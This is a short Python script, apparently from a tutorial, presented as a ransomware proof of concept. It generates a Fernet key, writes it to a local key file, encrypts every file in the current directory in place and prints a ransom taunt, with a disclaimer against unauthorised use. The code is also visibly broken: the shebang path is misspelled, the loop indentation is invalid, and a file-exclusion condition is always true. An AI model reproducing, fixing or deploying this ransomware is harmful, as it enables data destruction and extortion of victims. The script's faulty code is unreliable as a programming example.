#!/urs/bin/env python3
## This was made from watching tutorial at
##https://www.youtube.com/user/NetworkChuck

 #### WARNING ######
 # This is just a proof of concept is is not meant for any real world application.
 # DO NOT USE this script on any systems you don't have written, explicit permission for owner to do so
 # USE At OWN RISK, I am not responsible for ANY out come due to the usage of this script.
##### WARNING #####

import os
from cryptography.fernet import Fernet

files = []

        for file in os.listdir():
            if file == "encrypt.py" or file == "thekey.key" or "decrypt.py":
                continue
            if os.path.isfile(file):
                files.append(file)

print(files)


key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("All your files are encrypted, pay up sukka!")
